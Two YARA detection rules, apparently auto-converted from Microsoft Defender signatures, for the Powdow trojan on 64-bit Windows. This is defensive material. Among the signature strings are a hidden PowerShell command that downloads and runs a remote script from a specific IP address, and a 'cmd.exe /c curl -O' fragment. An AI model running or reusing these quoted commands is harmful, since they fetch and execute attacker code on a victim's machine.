rule Trojan_Win64_Powdow_NKA_2147949973_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/Powdow.NKA!MTB"
        threat_id = "2147949973"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TaskSchedulerCreateSchedule" ascii //weight: 1
        $x_2_2 = "-WindowStyle Hidden -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://176.124.206.88:9578/shell.ps1" ascii //weight: 2
        $x_1_3 = "powershell.exe" ascii //weight: 1
        $x_1_4 = "firefox.exe" ascii //weight: 1
        $x_1_5 = "C:\\etalon\\PocLowIL\\x64\\Release\\PocLowIL.pdb" ascii //weight: 1
        $x_1_6 = "NdrClientCall2" ascii //weight: 1
        $x_1_7 = "DllExport" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_Powdow_SXA_2147958139_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/Powdow.SXA!MTB"
        threat_id = "2147958139"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "34"
        strings_accuracy = "Low"
    strings:
        $x_20_1 = {48 b8 53 00 68 00 65 00 6c 00 48 ba 6c 00 5c 00 76 00 31 00 48 89 45 ?? 48 89 55 ?? 48 b8 2e 00 30 00 5c 00 70 00 48 ba 6f 00 77 00 65 00 72 00}  //weight: 20, accuracy: Low
        $x_10_2 = {48 89 55 18 4c 89 45 20 4c 89 4d 28 48 8b 45 18 48 8b 55 28 48 89 54 24 48 48 8b 55 20 48 89 54 24 40}  //weight: 10, accuracy: High
        $x_1_3 = "spawned cmd2" ascii //weight: 1
        $x_1_4 = "PowerShell" ascii //weight: 1
        $x_1_5 = "task.ps1" ascii //weight: 1
        $x_1_6 = "cmd.exe /c curl -O" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

